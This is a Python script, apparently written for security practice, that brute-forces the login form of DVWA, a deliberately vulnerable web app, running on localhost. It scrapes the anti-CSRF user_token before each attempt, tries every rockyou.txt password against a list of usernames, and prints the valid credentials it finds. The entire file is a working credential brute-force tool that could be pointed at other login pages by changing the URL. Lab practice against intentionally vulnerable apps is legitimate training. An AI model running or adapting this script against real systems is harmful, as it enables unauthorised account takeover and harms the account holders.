#!/usr/bin/python3

"""
Brute forcing script for DVWA login.php 

Make a file called usernames.txt for the username list
and use rockyou.txt as the password list.

Always look at burp suite to understand requests.

https://3.python-requests.org/user/advanced/ 

POST /DVWA/login.php HTTP/1.1
username=smithy&password=kk&Login=Login&user_token=1e7d9eb027e5fd1b6c0d43adde872986
"""

import requests
import time

def newSession():
    s = requests.Session()
    r = s.get('http://localhost/DVWA/login.php')
    # getting the required cookies
    headers = r.headers["Set-Cookie"].split(" ")
    cookies = []
    keywords = ["security", "PHPSESSID"]
    for i in headers:
        for j in range(len(keywords)):
            if keywords[j] in i:
                cookies.append(i)

    _cookies = {}
    for i in cookies:
        out = i.split("=")
        key = out[0]
        value = out[1].replace(";","")
        _cookies[key] = value
    
    return s, r

s, r = newSession()

def getToken(r):
    content = r.content.decode()
    cut = content.split("user_token")[1]
    return cut.split("'")[2]

with open("usernames.txt", "r") as f:
    _user = f.read().splitlines() # creates a list of usernames from a file.

number_of_usernames = len(_user)

invalid_msg = "Login failed"
# opens a password file to iterate through
password_file = open("/usr/share/wordlists/rockyou.txt", "r")
list_of_found = []
found_credentials = []

password = password_file.readline()

print("Searching for credentials...")
# print("Found:")
n = 0

try:
    while password:
        n+=1
        for username in _user:
            if username in list_of_found:
                continue
            print("Fuzzing ("+str(n)+"):", password, ":", username)#, end=', ')
            _token = getToken(r)
            r = s.post('http://localhost/DVWA/login.php', data={'username':username,"password":password,"Login":"Login","user_token":_token})
            if invalid_msg in r.content.decode():
                pass
                #print("Invalid")
            else:
                #print("Success")
                list_of_found.append(username)
                found_credentials.append(username+":"+password)
                print("Found ({}/{}) ".format(str(len(found_credentials)), str(number_of_usernames))+username+":"+password)
                s,r = newSession()
        if len(found_credentials) >= number_of_usernames:
            break
        try:
            password = password_file.readline().replace("\n", "")
            if not password: # compensating in case there is a missing line in the file.
                password = password_file.readline().replace("\n", "")
        except:
            break
except KeyboardInterrupt:
    print("Broke out of loop")
    pass

print()
print("Found credentials: ")
for i in found_credentials:
    print(i)

